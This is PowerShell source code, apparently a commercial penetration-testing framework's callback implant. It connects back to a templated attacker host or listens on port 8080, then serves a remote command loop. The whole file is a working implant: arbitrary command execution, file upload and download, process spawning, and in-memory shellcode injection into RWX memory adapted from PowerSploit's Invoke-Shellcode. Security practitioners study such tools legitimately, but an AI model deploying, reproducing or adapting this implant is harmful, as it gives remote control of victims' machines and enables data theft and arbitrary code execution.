# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2015
# http://www.immunityinc.com/CANVAS/ for more information
#
# POWERSHELL NODE FOR CANVAS
# MOSDEF TCP CALLBACK MODULE
# Ver: 1.0
# Author: Anibal
#

$GLOBAL::client
$GLOBAL::stream

Function run()
{
        
    $callback_host = "#__CALLBACK_HOST__#"
    $callback_port = #__CALLBACK_PORT__#
    $mosdef_type   = #__MOSDEF_TYPE__# 
    $mosdef_id     = #__MOSDEF_ID__#
    $listenport    = 8080

    $client = connect $callback_host $callback_port
    
    if (!$client){
        $listener = [System.Net.Sockets.TcpListener]$listenport
	$listener.start()
        $client = $listener.AcceptTcpClient()
    }
    else{
        try{
            $stream = $client.GetStream()
            #sending mosdef type
            [byte[]] $sendbytes = [Bitconverter]::GetBytes($mosdef_type)
            #move to big endian to send.
            [array]::Reverse($sendbytes)
            $stream.Write($sendbytes,0,$sendbytes.Length)
            
            #sending mosdef id
            $sendbytes = [Bitconverter]::GetBytes($mosdef_id)
            #move to big endian to send.
            [array]::Reverse($sendbytes)
            $stream.Write($sendbytes,0,$sendbytes.Length)

            $done = 0
            [byte[]]$buff = 0..3|%{0}
            [int]$len = 0
            [int]$comtype = 0
            #$enc = New-Object -TypeName System.Text.ASCIIEncoding
            $enc = New-Object -TypeName System.Text.UTF8Encoding
            $outstring = ""

            while ( $done -ne 1 )
            {
                
                #read length
                $count = $stream.Read($buff, 0, $buff.Length)
                if ( $count -eq 0 ){
                    #some error occurs
                    break
                }
                [array]::Reverse($buff)
                $len = [Bitconverter]::ToInt32($buff,0)

                #read command type
                $count = $stream.Read($buff, 0, $buff.Length)
                if ( $count -eq 0 ){
                    #some error occurs
                    break
                }

                [array]::Reverse($buff)
                $comtype = [Bitconverter]::ToInt32($buff,0)
               
                #If garbage is received                
                if ($comtype -le 0 -or $comtype -gt 9){
                    continue
                }


                $outstring = ""
                if ( $len -gt 0 ){
                    #read data
                    $data = 0
                    try{
                        $data = new-object System.Byte[] $len
                    }
                    catch [System.OutOfMemoryException]{
                        #skip the file if the file is tooo big(like 1GB)
                        [GC]::Collect()             
                        continue
                    }
                    $count= $stream.Read($data, 0, $len)
                    #write-host "len :" $len
                    #write-host "count :" $count
                                        
		    if( $len -gt $count -and $count -gt 0 ){
                        #need to catch the rest of the file
                        while ( $len -ne $count ){                   
                            $c = $stream.Read($data,$count,$len-$count)
                            $count = $count + $c                                                                                
                        }                                                                                         
                    }
                    
                    if ($comtype -ne 4){
                        #we don't need this in the upload                          
                        $outstring = $enc.GetString($data,0, $len)
                        #Write-host "outstring = "  $outstring                    
                    }            
        
                }
                
                
                switch($comtype)
                {
                    1{
                        #cwd                    
                        $output = getCwd                    
                        sendString($output)
                     }
                    2{
                        #chdir
                        #write-host "Change Dir"                    
                        changeDir($outstring)
                     }
                    3{
                        #runcommand
                        #Write-host "Runcommand"                    
                        $output = runCmd($outstring) 
                        #Write-host "output " $output                                                      
                        sendString($output)                    
                     }
                    4{
                        #upload
                        #write-host "upload file"                    
                        uploadFile $data $len
                     }
                    5{
                        #download: arguments are just a filename
                        #write-host $outstring
                        [byte[]]$fbytes = getFile($outstring)
                        #write-host "bytes from file =" $fbytes                    
                        mosdefSend($fbytes)             
                     }

                    6{
                        #spawn a process
                        $result = createProc($outstring) 
                        #Write-host "output " $result                                                      
                        sendString($result)                    
                    }
                    7{
                        #invoke-shellcode
                        $string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($outstring))
                        $shelly = @()
                        $shelly = $string.Split(",")
                        [BYTE[]] $Shellcode = $shelly
                        $result = Invoke-Shellcode -Shellcode $Shellcode                                                     
                        sendString($result)                   
                    }
                    8{
		        #write-host "exiting with exit code" $outstring
		        exit $outstring
                    }
                    9{
			#write-host "disconnecting..."
		        $client.Close()
                    }

                 }                                              
                $stream.Flush()
                #Force the garbage collector to free the data buffer
                $data=0
                [GC]::Collect()             
            }# while end
            
        }
        catch{
            write-host "Exception Type: $($_.Exception.GetType().FullName)" -ForegroundColor Red
            write-host "Exception Message: $($_.Exception.Message)" -ForegroundColor Red
        }
        $client.Close()
    }#else
    
    if ($listener){
        $listener.stop()
    }
}


Function connect( [String] $phost, [int] $pport )
{
    try{
        return New-Object System.Net.Sockets.TCPClient($phost,$pport)        
    }
    catch{        
    }    
}

Function createProc( [String] $exec )
{
        
    $data = $exec.split(" ")
    $filename = $data[0]
    $args = [string]::join(" " ,$data[1..$data.Length])
    
    #write-host "file " $filename
    #write-host "args " $args
    
    # no waiting for finish
    try{        
        if (!$args){
            $proc = Start-Process $filename -NoNewWindow -PassThru
        }
        else{
            $proc = Start-Process $filename -ArgumentList $args -NoNewWindow -PassThru
        }
        #$proc = Start-Process $filename -ArgumentList $args -NoNewWindow -PassThru
        #$proc.HasExited
        
        if ($proc){        
            return 1
        }
        else{
            return 0
        } 
    }
    catch{      
    }    
}

Function getCwd()
{
    [Environment]::CurrentDirectory
}

Function changeDir( [String] $dir )
{
    #check if directory exists
    if ( Test-Path $dir -PathType Container ) 
    {
      [Environment]::CurrentDirectory = $dir 
    }
    else
    {
       "Directory doesn't exist"
    }
}

Function runCmd( [String] $cmd )
{    
    #$command ="cmd.exe /c " + $cmd
    try{
        #Invoke-Expression -Command:$command 
        #write-host $cmd
        $sb_cmd = [scriptblock]::Create($cmd)
        return Invoke-Command -ScriptBlock $sb_cmd | Out-String                
    }
    catch{
        "Bad command"
    }     
}

Function getFile( [String] $filename )
{
    if ( Test-Path $filename -PathType Leaf ) 
    {
        #Get-Content $filename -Encoding Byte
        [io.file]::ReadAllBytes($filename)
    }
}

Function uploadFile( [byte[]] $data , [int] $len)
{
    #upload block is:
    #<size><command=4><length of name of file in big endian order><name of file><file data>                    
    #use $data because is an array of bytes
    
    [int] $filename_len, $in
                            
    $fn_buff = $data[0..3]
    [array]::Reverse($fn_buff)                    
    
    try{
        $filename_len = [Bitconverter]::ToInt32($fn_buff,0)                                                           
        $filename = $enc.GetString($data,4, $filename_len)               
        $in=4+$filename_len
                              
        saveFile $filename $data[$in .. $data.Count]     

    }
    catch{
        "Some problem occurred with the upload"
    }   

}

Function saveFile( [String] $filename , [byte[]] $filedata)
{
    #write-host "Save File"
    #write-host $filename
    #write-host $filedata
    #[io.file]::WriteAllBytes($filename,$filedata)
    $fileStream = New-Object System.IO.FileStream($filename, [System.IO.FileMode]'Create', [System.IO.FileAccess]'Write')              
    $fileStream.Write($filedata, 0, $filedata.Count)                
    $filestream.Dispose()
    $fileStream.Close()
    $fileStream = 0  

}

Function sendString( [String] $stringdata )
{
    #$enc = New-Object -TypeName System.Text.ASCIIEncoding
    #$enc = New-Object -TypeName System.Text.UnicodeEncoding
    $enc = New-Object -TypeName System.Text.UTF8Encoding
    [byte[]] $data = $enc.GetBytes($stringdata)
    mosdefSend($data)
}

Function mosdefSend( [byte[]] $data )
{     
    #write-host "mosdefsend" 
    if ( $data )
    {                       
        [byte[]] $lenbytes = [Bitconverter]::GetBytes($data.Length)    
        #move to big endian to send.
        [array]::Reverse($lenbytes)
        #write-host "len bytes to send " + $lenbytes
        #write-host $data.Length
        #write-host $data
        $stream.Write($lenbytes,0,$lenbytes.Length)       
        $stream.Write($data,0,$data.Length)
    } 
    else
    {
        [byte[]]$tmp = [Bitconverter]::GetBytes(0)
        [array]::Reverse($tmp)
        $stream.Write($tmp,0,$tmp.Length)
    }          
}

function Invoke-Shellcode
{
<#
.SYNOPSIS
Based on PowerSploit Function: Invoke-Shellcode Author: Matthew Graeber (@mattifestation) License: BSD 3-Clause
.LINK
http://www.exploit-monday.com
#>
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProcessID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0
    if ( $PSBoundParameters['ProcessID'] )
    {
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $CallStub = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  RAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  RAX
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  EAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  EAX
        }
        
        Write-Output $CallStub
    }

    
    function Local:Inject-LocalShellcode
    {
        if ($PowerShell32bit) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                return
            }
            
            $Shellcode = $Shellcode32
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                return
            }
            
            $Shellcode = $Shellcode64
        }
    
        # Allocate RWX memory for the shellcode
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$BaseAddress)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        # Copy shellcode to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)      
        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread        
        if ($PowerShell32bit)
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32           
        }
        else
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64            
        }

        # Allocate RWX memory for the thread call stub
        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$CallStubAddress)
        {
            Throw "Unable to allocate thread call stub."
        }
        # Copy call stub to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

        # Launch shellcode in it's own thread
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        # Wait for shellcode thread to terminate
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        write-output 'Shellcode injection complete!'
    }

    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
    if ($IsWow64ProcessAddr)
    {
    	$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        
        $64bitCPU = $true
    }
    else
    {
    	$64bitCPU = $false
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    
    if ($PSBoundParameters['Shellcode'])
    {
        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
        [Byte[]] $Shellcode32 = $Shellcode
        [Byte[]] $Shellcode64 = $Shellcode32
    }
    

    if ( $PSBoundParameters['ProcessID'] )
    {#DOES cliff need this
        # Inject shellcode into the specified process ID
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)    
        write-output "Injecting shellcode into PID: $ProcessId"    
        Inject-RemoteShellcode $ProcessId
  
    }
    else
    {
        # Inject shellcode into the currently running PowerShell process
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        write-output "Injecting shellcode into PowerShell"
        Inject-LocalShellcode
    }   
}



#Function mainLoop()
#{       
#}

#execute
run
